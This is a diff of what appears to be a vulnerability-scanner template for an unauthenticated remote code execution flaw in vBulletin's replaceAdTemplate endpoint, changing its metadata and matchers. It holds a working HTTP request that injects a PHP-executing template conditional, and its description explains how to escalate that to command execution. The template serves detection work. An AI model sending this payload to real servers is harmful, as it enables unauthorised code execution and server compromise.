@@ -2,10 +2,10 @@ id: vbulletin-replacead-rce
 
 info:
   name: vBulletin replaceAdTemplate - Remote Code Execution
-  author: DhiyaneshDK, Chocapikk
+  author: DhiyaneshDK
   severity: critical
   description: |
-    vBulletin versions 5.0.0 through 6.0.3 contain a Remote Code Execution (RCE) vulnerability in the ajax/api/ad/replaceAdTemplate endpoint. This flaw arises from improper use of PHP's Reflection API, allowing unauthenticated attackers to invoke protected controller methods. By injecting a crafted <vb:if> conditional that executes arbitrary PHP code via passthru($_POST[<param>]), and triggering it with a second request to ajax/render/ad_<location>, attackers can run arbitrary commands on the server as the webserver user.
+    vBulletin versions 5.1.0 through 6.0.3 contain a Remote Code Execution (RCE) vulnerability in the ajax/api/ad/replaceAdTemplate endpoint. This flaw arises from improper use of PHP’s Reflection API, allowing unauthenticated attackers to invoke protected controller methods. By injecting a crafted <vb:if> conditional that executes arbitrary PHP code via passthru($_POST[<param>]), and triggering it with a second request to ajax/render/ad_<location>, attackers can run arbitrary commands on the server as the webserver user.
   impact: |
     Successful exploitation allows unauthenticated remote attackers to execute arbitrary system commands as the web server user, resulting in full system compromise.
   remediation: |
@@ -13,15 +13,8 @@ info:
   reference:
     - https://karmainsecurity.com/pocs/vBulletin-replaceAdTemplate-RCE.php
     - https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce
-    - https://nvd.nist.gov/vuln/detail/CVE-2025-48827
-    - https://nvd.nist.gov/vuln/detail/CVE-2025-48828
   classification:
     cpe: cpe:2.3:a:vbulletin:vbulletin:*:*:*:*:*:*:*:*
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10
-    cve-id: CVE-2025-48827, CVE-2025-48828
-    cwe-id: CWE-424
-
   metadata:
     verified: true
     max-request: 1
@@ -29,7 +22,7 @@ info:
     product: vbulletin
     fofa-query: app="vBulletin"
     shodan-query: http.component:"vBulletin"
-  tags: cve,cve2025,rce,vbulletin,intrusive
+  tags: rce,vbulletin,intrusive
 
 variables:
   rand_string: "{{to_lower(rand_base(5))}}"
@@ -43,24 +36,12 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         routestring=ajax/api/ad/replaceAdTemplate&styleid=1&location={{rand_string}}&template=<vb:if condition='"var_dump"("{{rand_value}}")'></vb:if>
+
     matchers:
       - type: dsl
         dsl:
-          - status_code == 200
+          - contains(content_type,'application/json')
           - contains_all(body,'string(5)','{{rand_value}}')
-        condition: and
-
-  - raw:
-      - |
-        POST / HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-
-        routestring=ajax/render/ad_{{rand_string}}
-    matchers:
-      - type: dsl
-        dsl:
           - status_code == 200
-          - contains_all(body,'string(5)','{{rand_value}}')
         condition: and
-# digest: 4a0a00473045022100bea79f305c0a04204c85204dc770aa07bbdb4a16ada12ca5a7a3a0180d27be0d022017bbeb5c40deb616bb74977e0e74e707345dee71a7cc69737eb3d722fc4f0625:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a004730450221008e671054a88fb0137dc1fc25d70082c4737342bc71aa068a36b5185d570204c102204fd3753aa0deefd9466ff2ee59e6aaf2f7c667ec785cf1b59b94bb3700d24f9b:922c64590222798bb761d5b6d8e72950
